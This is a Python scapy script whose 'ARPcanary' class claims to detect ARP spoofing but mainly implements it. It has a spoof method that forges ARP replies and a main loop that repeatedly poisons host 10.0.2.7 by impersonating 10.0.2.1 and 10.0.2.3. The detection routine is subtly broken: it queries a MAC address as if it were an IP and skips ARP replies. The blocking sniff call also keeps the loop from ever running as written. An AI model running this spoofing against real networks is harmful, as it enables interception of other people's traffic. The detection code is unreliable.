#!/usr/bin/env python
# -*- coding: utf-8 -*-
import scapy.all as scapy


class ARPcanary:

    def __init__(self, interface="tun0", verbose=True):
        self.target_mac = None
        self.target_ip = None
        self.spoof_ip = None
        self.sent_packet_count = 0
        self.interface = interface
        self.verbose = verbose

    @staticmethod
    def get_mac(ip):
        arprequest = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arprequest_broadcast = broadcast / arprequest
        answered = scapy.srp(arprequest_broadcast,
                             timeout=2,
                             verbose=True)[0]
        return answered[0][1].hwsrc

    def sniff(self, iface=None):
        if iface is None:
            iface = self.interface
        scapy.sniff(iface=iface, store=False, prn=self.analyze)

    def analyze(self, packet):
        if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op != 2:
            print(packet.show())
            try:
                real_mac = self.get_mac(packet[scapy.ARP].psrc)
                resp_mac = self.get_mac(packet[scapy.ARP].hwsrc)

                if real_mac != resp_mac:
                    print("[!] POSSIBLE ARP SPOOF ATTACK DETECTED\n", packet.show())

            except IndexError:
                pass

    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2,
                           pdst=target_ip,
                           hwdst=target_mac,
                           psrc=spoof_ip)
        scapy.send(packet, verbose=self.verbose)

    def restore(self, destination, source):
        dest_mac = self.get_mac(destination)
        source_mac = self.get_mac(source)
        packet = scapy.ARP(op=2,
                           pdst=destination,
                           hwdst=dest_mac,
                           psrc=source,
                           hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=self.verbose)


if __name__ == "__main__":
    print("[*] Beginning ARP spoof detection")
    canary = ARPcanary()
    canary.sniff()
    target = '10.0.2.7'
    spoof1 = '10.0.2.1'
    spoof2 = '10.0.2.3'
    while True:
        canary.spoof(target_ip=target, spoof_ip=spoof1)
        canary.spoof(target_ip=target, spoof_ip=spoof2)
        canary.sent_packet_count += 2
        print(f"\r[+] Packets sent: {canary.sent_packet_count}", end="")
